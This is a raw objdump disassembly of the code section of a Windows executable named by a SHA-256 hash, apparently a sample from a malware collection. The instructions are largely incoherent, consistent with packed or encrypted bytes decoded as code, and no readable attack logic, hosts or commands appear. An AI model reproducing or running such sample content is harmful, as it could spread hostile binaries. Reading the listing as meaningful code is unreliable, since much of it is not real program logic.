
1bacdf198de3b85653ab0cc9f7e447966fc38853326c1960f2a31306867643fa.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	mov    WORD PTR [eax-0x3c],fs
  411003:	ins    BYTE PTR es:[edi],dx
  411004:	push   ebp
  411005:	and    al,0x2
  411007:	add    al,BYTE PTR [eax]
  411009:	or     BYTE PTR [edx],ah
  41100b:	and    al,al
  41100d:	add    al,0x3
  41100f:	int3   
  411010:	bound  ecx,QWORD PTR [eax+eax*1]
  411013:	and    BYTE PTR [eax+0x201b0064],al
  411019:	adc    BYTE PTR [ebx+eax*1+0xc822c01],ch
  411020:	cwde   
  411021:	dec    edx
  411022:	add    al,0x80
  411024:	and    DWORD PTR [eax],edi
  411026:	add    BYTE PTR [esi],al
  411028:	and    DWORD PTR [eax],eax
  41102a:	fiadd  WORD PTR [ecx]
  41102c:	data16 lods al,BYTE PTR ds:[esi]
  41102e:	rol    DWORD PTR [eax],1
  411030:	add    BYTE PTR [esi+0x61904],0x38
  411037:	mov    cl,BYTE PTR [eax+0x290d900a]
  41103d:	add    al,0x2
  41103f:	lea    ecx,[eax]
  411041:	add    BYTE PTR [ecx],al
  411043:	or     BYTE PTR [esp+eax*1],0x0
  411047:	and    al,0x88
  411049:	add    DWORD PTR [eax-0x3e],ebp
  41104c:	add    eax,DWORD PTR [eiz*1+0x40a18021]
  411053:	ret    0xa000
  411056:	inc    eax
  411057:	add    BYTE PTR [eax+0x8],bl
  41105a:	xor    BYTE PTR [eax+0x52],dh
  41105d:	add    BYTE PTR ds:0x42909030,al
  411063:	or     BYTE PTR [eax+0x1],cl
  411066:	enter  0x6518,0x22
  41106a:	adc    BYTE PTR [edx+0x78],al
  41106d:	adc    al,0x14
  41106f:	imul   eax,DWORD PTR [eax],0x0
  411072:	inc    esp
  411073:	add    al,0x11
  411075:	test   al,0x98
  411077:	or     al,0xd2
  411079:	or     BYTE PTR [edx],0x8
  41107c:	push   eax
  41107d:	add    al,BYTE PTR [eax-0x77740000]
  411083:	test   DWORD PTR [eax],eax
  411085:	sub    al,ah
  411087:	imul   eax,DWORD PTR [ecx],0x805aa0a2
  41108d:	nop
  41108e:	adc    DWORD PTR [ecx],eax
  411090:	add    DWORD PTR [ecx],0xa2700884
  411096:	and    al,BYTE PTR [ecx+ebp*4]
  411099:	adc    bh,BYTE PTR [edx]
  41109b:	push   eax
  41109c:	add    eax,DWORD PTR [edx+eax*4+0x30]
  4110a0:	push   eax
  4110a1:	adc    BYTE PTR [eax+ebx*1+0x0],bl
  4110a5:	add    BYTE PTR [ecx],0x8a
  4110a8:	cmp    cl,0xd1
  4110ab:	add    cl,BYTE PTR [eax-0x5faff000]
  4110b1:	mov    al,ds:0x68440209
  4110b6:	adc    BYTE PTR [eax],al
  4110b8:	add    DWORD PTR [eax],esp
  4110ba:	and    DWORD PTR [ecx],edx
  4110bc:	and    BYTE PTR [ecx+0x28],ah
  4110bf:	sbb    BYTE PTR fs:[eax+0xd010],cl
  4110c6:	add    al,0x94
  4110c8:	push   cs
  4110c9:	inc    eax
  4110ca:	lock push cs
  4110cc:	or     DWORD PTR [ecx],eax
  4110ce:	xor    al,0xc8
  4110d0:	mov    BYTE PTR [edx-0x4bfccbb7],ch
  4110d6:	jo     0x4110d8
  4110d8:	and    BYTE PTR [edx-0x71],al
  4110db:	add    al,BYTE PTR [eax-0x26dffd3f]
  4110e1:	and    BYTE PTR [ebp+0xd],dh
  4110e4:	mov    ds:0x54000084,eax
  4110e9:	and    DWORD PTR [eax],eax
  4110eb:	add    al,0xa9
  4110ed:	inc    eax
  4110ee:	ds inc eax
  4110f0:	mov    al,ds:0x44803402
  4110f5:	sbb    BYTE PTR [ecx],0x60
  4110f8:	inc    esi
  4110f9:	or     BYTE PTR [eax+0x40],cl
  4110fc:	adc    DWORD PTR [eax],eax
  4110fe:	add    DWORD PTR [eax+0x67240c00],ecx
  411104:	inc    eax
  411105:	add    al,BYTE PTR [ecx]
  411107:	add    DWORD PTR [ebx+ecx*4],esi
  41110a:	add    al,0x0
  41110c:	add    al,BYTE PTR [eax+eax*4]
  41110f:	inc    eax
  411110:	push   esi
  411111:	and    al,0xc0
  411113:	add    BYTE PTR [esp+eax*1],al
  411116:	add    DWORD PTR [edx+0xf],0x81000040
  41111d:	and    bl,BYTE PTR [ebx+0x640c5598]
  411123:	xor    BYTE PTR [eax+0x9],bl
  411126:	and    BYTE PTR [eax+edx*4+0x0],0x22
  41112b:	or     al,0x1
  41112d:	push   cs
  41112e:	push   es
  41112f:	add    al,0x20
  411131:	imul   ecx,DWORD PTR [edx],0x40743611
  411137:	je     0x41114c
  411139:	fwait
  41113a:	add    BYTE PTR [eax],bl
  41113c:	mov    ds:0xc0870943,al
  411141:	(bad)  
  411142:	and    BYTE PTR [ecx],dl
  411144:	and    edx,DWORD PTR [eax+0x41c11500]
  41114a:	nop
  41114b:	dec    eax
  41114c:	add    al,BYTE PTR [edx+0x0]
  41114f:	sbb    eax,DWORD PTR [eax-0x7c]
  411152:	add    al,0x6
  411154:	ret    
  411155:	add    BYTE PTR [eax],ah
  411157:	or     al,BYTE PTR [edx]
  411159:	or     BYTE PTR [eax],cl
  41115b:	sbb    cl,BYTE PTR [ebx+eax*4]
  41115e:	add    cl,BYTE PTR [eax+eax*1]
  411161:	jb     0x4111ab
  411163:	adc    BYTE PTR [edx+eax*4+0x10160c50],ch
  41116a:	data16 cmp al,dh
  41116d:	and    BYTE PTR [eax],0x51
  411170:	xor    DWORD PTR [edx+0x42003598],edx
  411176:	add    BYTE PTR [eax],0x26
  411179:	nop
  41117a:	adc    esp,eax
  41117c:	and    BYTE PTR [eax+0x64228060],0x0
  411183:	jmp    0xec517618
  411188:	and    BYTE PTR [esi],al
  41118a:	adc    dl,BYTE PTR [ebx]
  41118c:	adc    DWORD PTR [eax],eax
  41118e:	add    BYTE PTR [eax+eax*8],al
  411191:	verw   WORD PTR [edx]
  411194:	inc    eax
  411195:	arpl   WORD PTR [eax+0x40],ax
  411198:	or     DWORD PTR [edx+eax*2],esp
  41119b:	fimul  DWORD PTR [eax]
  41119d:	inc    eax
  41119e:	or     DWORD PTR [ecx],edx
  4111a0:	inc    eax
  4111a1:	shl    BYTE PTR [ecx],1
  4111a3:	pusha  
  4111a4:	test   al,0xc0
  4111a6:	adc    al,BYTE PTR [edx]
  4111a8:	loop   0x4111bf
  4111aa:	push   esp
  4111ab:	add    BYTE PTR es:[eax],ah
  4111ae:	xor    BYTE PTR es:[ecx],ch
  4111b1:	inc    eax
  4111b2:	and    BYTE PTR [eax],al
  4111b4:	sub    DWORD PTR [edx+0x4901c100],0x2b22990
  4111be:	mov    ds:0xb0195081,al
  4111c3:	add    BYTE PTR [edx+edx*1+0x8880309],cl
  4111ca:	add    DWORD PTR [ecx-0x6f7affe7],eax
  4111d0:	or     al,0x41
  4111d2:	push   0x30032119
  4111d7:	sub    BYTE PTR [eax],dl
  4111d9:	xor    BYTE PTR [eax],al
  4111db:	mov    al,ds:0xa8ec081
  4111e0:	add    al,0x40
  4111e2:	inc    esp
  4111e3:	add    BYTE PTR [eax],al
  4111e5:	sbb    DWORD PTR [eax-0x18],0xffffff9a
  4111e9:	adc    al,BYTE PTR [eax]
  4111eb:	test   BYTE PTR [ecx+0x2],dl
  4111ee:	push   eax
  4111ef:	sub    esp,DWORD PTR [ecx+0x0]
  4111f2:	xchg   ebx,eax
  4111f3:	and    bh,al
  4111f5:	adc    BYTE PTR [ebx],ah
  4111f7:	cmp    al,0x12
  4111f9:	or     DWORD PTR [eax],0x8000002b
  4111ff:	test   al,0x4
  411201:	test   ah,cl
  411203:	and    BYTE PTR [eax+0x41008200],al
  411209:	or     dl,BYTE PTR [eax]
  41120b:	adc    BYTE PTR [eax-0x80],al
  41120e:	or     DWORD PTR fs:[ecx],eax
  411211:	mov    eax,ds:0x80021002
  411216:	sub    eax,0xe0ab1401
  41121b:	and    BYTE PTR [eax],dl
  41121d:	add    BYTE PTR [ecx],al
  41121f:	and    BYTE PTR [eax],cl
  411221:	adc    ah,BYTE PTR [ecx]
  411223:	push   es
  411224:	inc    eax
  411225:	inc    esp
  411226:	and    BYTE PTR [ecx],al
  411228:	adc    BYTE PTR [eax],dh
  41122a:	add    BYTE PTR [ebx],al
  41122c:	inc    ecx
  41122d:	push   es
  41122e:	or     al,0xa2
  411230:	add    DWORD PTR [edx],esp
  411232:	add    BYTE PTR [eax],0x1
  411235:	cmovs  eax,eax
  411238:	add    al,BYTE PTR [eax]
  41123a:	add    BYTE PTR [eax+0x1b100821],0x40
  411241:	add    BYTE PTR [esi],al
  411243:	mov    dl,0x22
  411245:	add    DWORD PTR [eax],esp
  411247:	sub    BYTE PTR [esp+edx*8],al
  41124a:	or     dl,BYTE PTR [ecx+0x10488424]
  411250:	inc    edi
  411251:	and    BYTE PTR [edx+0x4],ah
  411254:	add    al,0x82
  411256:	sub    al,0x81
  411258:	add    al,BYTE PTR [eax-0x171ffffa]
  41125e:	adc    al,0x80
  411260:	sub    BYTE PTR [ecx],cl
  411262:	sub    BYTE PTR [eax],cl
  411264:	and    BYTE PTR [ecx],al
  411266:	and    al,al
  411268:	inc    ecx
  411269:	dec    eax
  41126a:	add    DWORD PTR [eax],ecx
  41126c:	or     DWORD PTR [eax],ecx
  41126e:	add    eax,0x20202022
  411273:	add    cl,BYTE PTR [eax+eax*1]
  411276:	dec    edx
  411277:	adc    BYTE PTR [ecx],al
  411279:	pop    ebp
  41127a:	push   0x602280c0
  41127f:	or     DWORD PTR [esi],ecx
  411281:	inc    eax
  411282:	sub    BYTE PTR [eax],dl
  411284:	add    BYTE PTR [edx],0x0
  411287:	push   ecx
  411288:	or     DWORD PTR [ecx],0x20880852
  41128e:	push   cs
  41128f:	add    DWORD PTR [eax-0x19],ecx
  411292:	adc    BYTE PTR [eax+0xcc80041],al
  411298:	add    BYTE PTR [eax],ah
  41129a:	or     BYTE PTR [esp+ecx*4],0x0
  41129e:	and    DWORD PTR [eax],ecx
  4112a0:	add    cl,BYTE PTR [ecx]
  4112a2:	test   al,0x80
  4112a4:	or     DWORD PTR [eax+ecx*1+0x2],esp
  4112a8:	dec    ebx
  4112a9:	pusha  
  4112aa:	add    BYTE PTR [eax],ah
  4112ac:	and    BYTE PTR [eax],ah
  4112ae:	and    BYTE PTR [eax+eax*1-0x56],ah
  4112b2:	and    ebp,DWORD PTR [eax]
  4112b4:	or     BYTE PTR [eax+ecx*4+0x20],cl
  4112b8:	mov    ?,WORD PTR [ecx-0x72]
  4112bb:	add    al,0x49
  4112bd:	enter  0x362,0x81
  4112c1:	sbb    BYTE PTR [eax-0x40],ah
  4112c4:	add    ch,BYTE PTR [edx]
  4112c6:	and    eax,0x8c008a9
  4112cb:	shl    BYTE PTR fs:[eax+eax*4],0x0
  4112d0:	or     BYTE PTR [eax],dl
  4112d2:	scas   eax,DWORD PTR es:[edi]
  4112d3:	inc    esi
  4112d4:	js     0x4112de
  4112d6:	add    al,0x4
  4112d8:	add    dl,al
  4112da:	add    DWORD PTR [ecx+eax*1],esp
  4112dd:	adc    BYTE PTR [eax],dl
  4112df:	push   es
  4112e0:	and    al,0x64
  4112e2:	xor    BYTE PTR [eax+0x0],al
  4112e5:	adc    BYTE PTR [eax+0x7],0x10
  4112e9:	add    dl,BYTE PTR [eax]
  4112eb:	ins    DWORD PTR es:[edi],dx
  4112ec:	or     BYTE PTR [eax*1-0x4db7bdd0],bl
  4112f3:	and    BYTE PTR [ecx+0x14],al
  4112f6:	adc    BYTE PTR [eax],al
  4112f8:	mov    al,ds:0x20195524
  4112fd:	adc    BYTE PTR ds:0x35200910,0xc4
  411304:	rcr    BYTE PTR ds:0x1c607309,0x40
  41130b:	mov    al,ds:0xcc013518
  411310:	add    eax,0x1b411e80
  411315:	dec    edi
  411316:	mov    eax,ds:0x24600811
  41131b:	push   ss
  41131c:	push   eax
  41131d:	sub    BYTE PTR [eax],al
  41131f:	sub    BYTE PTR [esi],al
  411321:	es adc al,al
  411324:	or     al,0x20
  411326:	inc    eax
  411327:	push   0xa4000200
  41132c:	add    esi,0x1277c40a
  411332:	add    BYTE PTR [eax],cl
  411334:	add    BYTE PTR [ecx],dl
  411336:	push   0x1304002
  41133b:	add    al,0x90
  41133d:	cmp    eax,0x41c2460b
  411342:	add    BYTE PTR [eax+0x1c16201],cl
  411348:	add    BYTE PTR [eax+0x2],bh
  41134b:	xor    BYTE PTR [eax-0x80],0x50
  41134f:	xchg   esi,eax
  411350:	xor    BYTE PTR [eax],al
  411352:	inc    eax
  411353:	sahf   
  411354:	dec    edx
  411355:	add    DWORD PTR [eax+ecx*4+0x20680000],eax
  41135c:	or     eax,DWORD PTR [eax]
  41135e:	inc    eax
  41135f:	mov    BYTE PTR [eax],cl
  411361:	or     BYTE PTR [eax],ah
  411363:	adc    al,0x20
  411365:	inc    esi
  411366:	rcl    BYTE PTR [ecx+0x40024a00],0x40
  41136d:	pusha  
  41136e:	mov    al,ds:0x849a8801
  411373:	add    DWORD PTR [eax+0x10],eax
  411376:	mov    eax,ds:0x9180806a
  41137b:	nop
  41137c:	xchg   esp,eax
  41137d:	leave  
  41137e:	loope  0x4113c4
  411380:	test   DWORD PTR [eax-0x60],eax
  411383:	nop
  411384:	add    BYTE PTR [ecx-0x7fff73d0],al
  41138a:	and    BYTE PTR ds:0xe0a08001,0xd
  411391:	add    BYTE PTR [eax],al
  411393:	and    al,BYTE PTR [ecx+0x28]
  411396:	and    BYTE PTR [eax],cl
  411398:	inc    edx
  411399:	xchg   edx,eax
  41139a:	pop    esi
  41139b:	add    BYTE PTR [eax],dl
  41139d:	mov    al,ds:0x10000100
  4113a2:	es xchg esp,eax
  4113a4:	or     eax,edi
  4113a6:	push   es
  4113a7:	test   BYTE PTR [eax],ah
  4113a9:	dec    eax
  4113aa:	enter  0x1404,0x0
  4113ae:	adc    al,BYTE PTR [esi]
  4113b0:	add    BYTE PTR [edx],ah
  4113b2:	push   eax
  4113b3:	inc    ecx
  4113b4:	inc    esp
  4113b5:	dec    esp
  4113b6:	add    DWORD PTR [eax],0x4420049
  4113bc:	or     BYTE PTR [eax],al
  4113be:	adc    BYTE PTR [eax],al
  4113c0:	inc    eax
  4113c1:	cmp    DWORD PTR [ecx],eax
  4113c3:	rcl    BYTE PTR [esi+0x7980c002],0x11
  4113ca:	adc    DWORD PTR [eax+ecx*2],eax
  4113cd:	inc    ecx
  4113ce:	add    eax,DWORD PTR [eax]
  4113d0:	jmp    0x106:0x272452a0
  4113d7:	and    dl,al
  4113d9:	and    BYTE PTR [ecx],0x2
  4113dc:	add    DWORD PTR ds:0x6de8a294,0x4023b381
  4113e6:	dec    esp
  4113e7:	add    al,BYTE PTR [esi+0x31802200]
  4113ed:	add    BYTE PTR [eax+0x10049d01],dl
  4113f3:	adc    BYTE PTR [esi+eax*1+0xa],al
  4113f7:	dec    eax
  4113f8:	or     BYTE PTR [esi],ah
  4113fa:	or     BYTE PTR [ecx],al
  4113fc:	adc    ah,BYTE PTR [eax+0x1]
  4113ff:	add    BYTE PTR [eax],al
  411401:	add    al,0xc4
  411403:	add    BYTE PTR [eax],0x42
  411406:	mov    DWORD PTR [ecx-0x5fcff7dc],esi
  41140c:	or     BYTE PTR [eax+eax*2],dl
  41140f:	add    eax,eax
  411411:	cwde   
  411412:	rol    DWORD PTR [ebp-0x67e53800],1
  411418:	add    BYTE PTR [eax],ch
  41141a:	or     DWORD PTR [eax+0x40204203],ebx
  411420:	add    DWORD PTR [esi],esp
  411422:	ret    0x10e
  411425:	add    DWORD PTR [eax],0x2a0008
  41142b:	inc    eax
  41142c:	and    BYTE PTR [eax+0x56840902],0x5
  411433:	xchg   ebx,eax
  411434:	add    BYTE PTR [eax],al
  411436:	add    DWORD PTR [ecx],0xa700131
  41143c:	push   ecx
  41143d:	push   cs
  41143e:	sub    BYTE PTR [eax+0x40],al
  411441:	imul   edx,DWORD PTR [edx],0x9c10506
  411447:	mov    al,0xa0
  411449:	add    eax,DWORD PTR [eax]
  41144b:	mov    fs,WORD PTR [eax]
  41144d:	pusha  
  41144e:	and    al,0x0
  411450:	add    BYTE PTR [ecx],al
  411452:	dec    esp
  411453:	sbb    al,0x40
  411455:	push   eax
  411456:	xor    ch,BYTE PTR [edi]
  411458:	sub    dl,BYTE PTR [eax]
  41145a:	(bad)  
  41145b:	add    BYTE PTR [eax],0xc0
  41145e:	and    al,0xa4
  411460:	adc    ah,bh
  411462:	sbb    BYTE PTR [eax],0xa
  411465:	loopne 0x4113e7
  411467:	adc    al,0x3
  411469:	and    BYTE PTR [edx+0x9],al
  41146c:	les    eax,FWORD PTR [eax]
  41146e:	sub    al,0x56
  411470:	loope  0x411472
  411472:	xchg   DWORD PTR [esi],eax
  411474:	xchg   edx,eax
  411475:	and    ecx,DWORD PTR [eax]
  411477:	add    BYTE PTR [ecx],0xa0
  41147a:	push   esp
  41147b:	mov    BYTE PTR [eax],ah
  41147d:	test   BYTE PTR [eax-0x4fdabf3e],ah
  411483:	or     BYTE PTR [ecx],0x3
  411486:	add    BYTE PTR [esp+eax*2+0x40],dl
  41148a:	dec    eax
  41148b:	add    DWORD PTR [esi+ecx*2-0x7dd976ff],eax
  411492:	add    DWORD PTR [eax],0x20012040
  411498:	dec    eax
  411499:	ret    0x4006
  41149c:	mov    al,ds:0x841442
  4114a1:	push   edx
  4114a2:	adc    al,BYTE PTR [eax+0x108489c0]
  4114a8:	or     BYTE PTR [eax+0x4228a220],0x0
  4114af:	add    al,0x39
  4114b1:	inc    eax
  4114b2:	inc    eax
  4114b3:	xor    BYTE PTR [eax+0x28],al
  4114b6:	push   esp
  4114b7:	sub    eax,0xb04dd01
  4114bc:	adc    BYTE PTR [eax],ah
  4114be:	inc    ecx
  4114bf:	push   cs
  4114c0:	add    esp,DWORD PTR [eax+0x60]
  4114c3:	rcl    DWORD PTR [eax],0x19
  4114c6:	add    al,0x61
  4114c8:	add    DWORD PTR [eax],eax
  4114ca:	add    al,0x10
  4114cc:	xchg   ecx,eax
  4114cd:	add    BYTE PTR [eax+ebx*4],dl
  4114d0:	pusha  
  4114d1:	add    DWORD PTR [ebx],esp
  4114d3:	stos   BYTE PTR es:[edi],al
  4114d4:	add    BYTE PTR [eax],al
  4114d6:	add    cl,BYTE PTR [eax]
  4114d8:	push   cs
  4114d9:	ja     0x4114df
  4114db:	and    BYTE PTR [eax-0x4b],0x88
  4114df:	sbb    eax,ecx
  4114e1:	nop
  4114e2:	inc    edx
  4114e3:	mov    BYTE PTR [edx+0x14605061],cl
  4114e9:	and    BYTE PTR [edi],dl
  4114eb:	dec    esp
  4114ec:	and    al,0x39
  4114ee:	and    BYTE PTR [eax+esi*4],al
  4114f1:	add    BYTE PTR [eax],dl
  4114f3:	add    BYTE PTR [ebx+0x22603324],al
  4114f9:	or     eax,ecx
  4114fb:	lods   al,BYTE PTR ds:[esi]
  4114fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114fd:	inc    eax
  4114fe:	ins    BYTE PTR es:[edi],dx
  4114ff:	xor    ah,ah
  411501:	inc    esp
  411502:	sbb    BYTE PTR [eax],al
  411504:	add    al,0xc
  411506:	popa   
  411507:	cmp    cl,BYTE PTR [ecx+eax*1+0x0]
  41150b:	or     BYTE PTR [eax],al
  41150d:	lods   al,BYTE PTR ds:[esi]
  41150e:	mov    ch,BYTE PTR [eax+eax*1-0x7de3a438]
  411515:	add    DWORD PTR [edx+ebp*4],ebp
  411518:	add    edx,DWORD PTR [ebp+0x1001006]
  41151e:	or     cl,al
  411520:	add    BYTE PTR [ebx-0x4e],dl
  411523:	and    eax,0x20501100
  411528:	mov    DWORD PTR [ebx],eax
  41152a:	or     ah,BYTE PTR [eax]
  41152c:	dec    edx
  41152d:	adc    BYTE PTR [eax],al
  41152f:	dec    eax
  411530:	add    al,0x20
  411532:	out    dx,eax
  411533:	add    BYTE PTR [eax],al
  411535:	sbb    BYTE PTR [eax],ah
  411537:	lea    ebx,[eax]
  411539:	add    dl,BYTE PTR [ecx-0x1b]
  41153c:	push   0x1
  41153e:	and    al,BYTE PTR [eax-0x40]
  411541:	and    eax,DWORD PTR [edi+eax*4+0x80b80b1]
  411548:	add    BYTE PTR [esp+eax*1],0x10
  41154c:	popa   
  41154d:	inc    dx
  41154f:	bound  esp,QWORD PTR [eax]
  411551:	test   BYTE PTR [eax],al
  411553:	add    bl,al
  411555:	mov    ecx,DWORD PTR [ebx+eiz*1]
  411558:	add    al,BYTE PTR ds:0x10400301
  41155e:	adc    ch,BYTE PTR [edx+0x9]
  411561:	add    BYTE PTR [ebp+0x8],cl
  411564:	add    BYTE PTR [edx],al
  411566:	adc    DWORD PTR [esi+0x1c0a1a4],eax
  41156c:	add    DWORD PTR [ebx+0x8d04400],edx
  411572:	add    eax,0x48805000
  411577:	(bad)  
  411578:	sbb    BYTE PTR [esp+eax*4+0xb0c1188],al
  41157f:	xor    al,BYTE PTR [edx]
  411581:	and    BYTE PTR [eax],al
  411583:	and    BYTE PTR [esi],al
  411585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411586:	add    al,0x20
  411588:	nop
  411589:	sub    al,BYTE PTR [eax-0x70]
  41158c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41158d:	and    BYTE PTR [ecx+0x10],ah
  411590:	or     DWORD PTR [ecx+0x48],eax
  411593:	add    al,0x80
  411595:	mov    BYTE PTR [ecx],ch
  411597:	mov    al,0x21
  411599:	add    al,cl
  41159b:	dec    edx
  41159c:	int3   
  41159d:	push   es
  41159e:	inc    eax
  41159f:	add    al,0x60
  4115a1:	add    eax,0x148320
  4115a6:	adc    BYTE PTR [eax+0x414102a],dl
  4115ac:	and    DWORD PTR [ecx+0x10002084],0x40004400
  4115b6:	fwait
  4115b7:	add    al,0x1
  4115b9:	add    BYTE PTR [eax],cl
  4115bb:	nop
  4115bc:	inc    eax
  4115bd:	add    BYTE PTR [eax+0x59],al
  4115c0:	inc    ecx
  4115c1:	mov    eax,DWORD PTR [eax]
  4115c3:	add    al,0x30
  4115c5:	rcr    DWORD PTR [eax+0x18d048],1
  4115cb:	xchg   ebp,eax
  4115cc:	add    DWORD PTR gs:[eax],0x410042a0
  4115d3:	add    BYTE PTR [eax+0x5102e031],cl
  4115d9:	and    BYTE PTR [eax],0x1c
  4115dc:	inc    eax
  4115dd:	push   ecx
  4115de:	pusha  
  4115df:	and    BYTE PTR [ebx],0x8
  4115e2:	sldt   WORD PTR [edx-0x7f7bffbd]
  4115e9:	or     BYTE PTR [eax-0x7e],cl
  4115ec:	inc    eax
  4115ed:	add    cl,BYTE PTR [eax-0x3dfffb7f]
  4115f3:	add    eax,DWORD PTR [eax]
  4115f5:	or     BYTE PTR [eax],al
  4115f7:	sub    BYTE PTR [eax],al
  4115f9:	enter  0x1008,0x91
  4115fd:	mov    cl,0x92
  4115ff:	shl    DWORD PTR [eax+eiz*2+0x40269608],0x24
  411607:	mov    ds:0x10a4116,al
  41160c:	mov    BYTE PTR [esi-0x67ffefff],ah
  411612:	mov    DWORD PTR ds:0x42300a10,edx
  411618:	add    BYTE PTR [eax+0x850d20e],ah
  41161e:	rol    DWORD PTR [eax],0xd2
  411621:	adc    dl,0x42
  411624:	add    DWORD PTR [eax-0x20],eax
  411627:	add    cl,al
  411629:	adc    BYTE PTR [ecx],al
  41162b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41162c:	mov    WORD PTR [esi+0x9080118],fs
  411632:	add    DWORD PTR [ecx+0x184008a],0x8080060
  41163c:	(bad)  
  41163d:	sbb    BYTE PTR [eax],ah
  41163f:	or     DWORD PTR [ebp+0x15220981],eax
  411645:	adc    al,0x42
  411647:	ror    BYTE PTR [esi],cl
  411649:	pusha  
  41164a:	nop
  41164b:	and    al,BYTE PTR ds:0xb08a4849
  411651:	inc    eax
  411652:	inc    eax
  411653:	add    al,0x97
  411655:	sbb    BYTE PTR [eax+0x42222022],cl
  41165b:	inc    eax
  41165c:	test   BYTE PTR [edx],ah
  41165e:	inc    esp
  41165f:	push   edx
  411660:	sbb    BYTE PTR [ebx],al
  411662:	add    BYTE PTR [eax],0x50
  411665:	mov    ds:0x40009388,al
  41166a:	ret    0xa90
  41166d:	arpl   WORD PTR [eax],ax
  41166f:	or     ah,BYTE PTR [eax+0x305c0801]
  411675:	adc    al,0x8
  411677:	or     BYTE PTR [eax+0x1],0x39
  41167b:	add    dl,BYTE PTR [ecx-0x7677f6dc]
  411681:	push   esi
  411682:	adc    BYTE PTR [eax],dl
  411684:	dec    esp
  411685:	bound  esp,QWORD PTR [edi]
  411687:	add    BYTE PTR [eax],al
  411689:	leave  
  41168a:	add    al,BYTE PTR [eax]
  41168c:	pop    es
  41168d:	add    DWORD PTR [ebx],eax
  41168f:	add    BYTE PTR ds:0x4848208,dl
  411695:	add    BYTE PTR [ebx],0xc
  411698:	bound  eax,QWORD PTR [edi]
  41169a:	adc    al,BYTE PTR [eax+ecx*2+0x6410680]
  4116a1:	push   ds
  4116a2:	and    BYTE PTR [eax+0x8],ah
  4116a5:	popa   
  4116a6:	add    DWORD PTR [eax],ecx
  4116a8:	add    al,BYTE PTR [edx]
  4116aa:	add    DWORD PTR [eax],eax
  4116ac:	xchg   ebp,eax
  4116ad:	inc    eax
  4116ae:	add    BYTE PTR [eax],0x80
  4116b1:	add    dl,al
  4116b3:	or     al,0xd2
  4116b5:	xchg   edx,eax
  4116b6:	adc    ch,al
  4116b8:	add    BYTE PTR [eax-0x4f],al
  4116bb:	push   edx
  4116bc:	adc    BYTE PTR [ebp+0x6],bl
  4116bf:	adc    al,0x3
  4116c1:	xchg   ecx,eax
  4116c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116c3:	leave  
  4116c4:	add    BYTE PTR [eax],0xe
  4116c7:	sbb    BYTE PTR [edx+0x40c8004],ch
  4116cd:	and    DWORD PTR [esi-0x4c],edx
  4116d0:	or     eax,0x2602060
  4116d5:	add    BYTE PTR [ecx],cl
  4116d7:	adc    al,0x20
  4116d9:	add    BYTE PTR [eax+0x45043110],al
  4116df:	add    BYTE PTR [eax],ah
  4116e1:	outs   dx,BYTE PTR ds:[esi]
  4116e2:	inc    ecx
  4116e3:	and    BYTE PTR [eax],dl
  4116e5:	add    BYTE PTR [ecx+0x50],dl
  4116e8:	nop
  4116e9:	add    BYTE PTR [ebp+0x38898000],cl
  4116ef:	xor    dl,BYTE PTR [eax]
  4116f1:	or     dl,BYTE PTR [eax+0x42804008]
  4116f7:	jo     0x411761
  4116f9:	add    DWORD PTR [eax+0x415a0818],eax
  4116ff:	add    ah,BYTE PTR [edx]
  411701:	mov    DWORD PTR [eax],ebx
  411703:	inc    ecx
  411704:	sbb    BYTE PTR [eax],ah
  411706:	mov    WORD PTR [eax],ss
  411708:	and    al,0x29
  41170a:	dec    ebx
  41170b:	add    ah,BYTE PTR [eax]
  41170d:	pop    es
  41170e:	push   ecx
  41170f:	les    ecx,FWORD PTR [eax+0x6ea99061]
  411715:	add    BYTE PTR [edx],dl
  411717:	adc    BYTE PTR [esi],al
  411719:	add    al,0xc0
  41171b:	adc    DWORD PTR [edx],ecx
  41171d:	xchg   BYTE PTR [ecx+0x50],dl
  411720:	add    al,bh
  411722:	add    BYTE PTR [eax],al
  411724:	or     BYTE PTR [eax],dl
  411726:	and    ah,BYTE PTR [eax]
  411728:	jmp    0xc21a:0x50480
  41172f:	or     BYTE PTR [edx+0x30580084],dl
  411735:	push   ecx
  411736:	add    DWORD PTR [eax+0x20c2a180],esp
  41173c:	and    BYTE PTR [eax+0x1c],ah
  41173f:	rcl    BYTE PTR [esp+eax*1+0x7c],0x30
  411744:	add    DWORD PTR [edx],eax
  411746:	xor    DWORD PTR [eax-0x80],esp
  411749:	and    BYTE PTR [eax],al
  41174b:	and    BYTE PTR [eax],0x28
  41174e:	mov    al,0x3
  411750:	or     al,al
  411752:	or     al,0xc8
  411754:	mov    BYTE PTR [ecx+0x8d42e50],al
  41175a:	test   BYTE PTR [eax],ch
  41175c:	add    BYTE PTR [eax+0x6],ah
  41175f:	test   eax,0x42e10101
  411764:	push   eax
  411765:	add    al,BYTE PTR [eax]
  411767:	or     BYTE PTR [ebp*4+0xc910410],al
  41176e:	or     BYTE PTR [esi],ah
  411770:	test   BYTE PTR [ecx+0x10700ca0],al
  411776:	lock add BYTE PTR ss:[eax+ecx*4],dl
  41177b:	test   al,0x58
  41177d:	add    al,BYTE PTR [eax+0x6]
  411780:	pop    eax
  411781:	bound  edx,QWORD PTR [edx]
  411783:	add    ah,BYTE PTR [eax+0x40091c05]
  411789:	add    DWORD PTR [eax-0x79],eax
  41178c:	and    BYTE PTR [ebx],0x60
  41178f:	adc    cl,BYTE PTR [ecx]
  411791:	or     al,BYTE PTR [eax]
  411793:	add    BYTE PTR [eax],0x50
  411796:	inc    edx
  411797:	adc    BYTE PTR [edx],ah
  411799:	and    al,0x49
  41179b:	dec    eax
  41179c:	or     al,BYTE PTR [eax]
  41179e:	sbb    BYTE PTR [edx],al
  4117a0:	cmp    BYTE PTR [eax+0x10],al
  4117a3:	xor    DWORD PTR [edx+0x0],eax
  4117a6:	add    al,0x0
  4117a8:	and    BYTE PTR [edx],al
  4117aa:	mov    eax,ds:0xc0430840
  4117af:	mov    BYTE PTR [ebp+eax*1+0x28408114],dh
  4117b6:	les    eax,FWORD PTR [ebx+0x8]
  4117b9:	sub    BYTE PTR [ecx],al
  4117bb:	adc    al,BYTE PTR [eax]
  4117bd:	mov    DWORD PTR [eax],esi
  4117bf:	add    DWORD PTR [edx+eax*1],edx
  4117c2:	sub    BYTE PTR [eax+0x404d8a9],0x49
  4117c9:	cmp    BYTE PTR [eax],ch
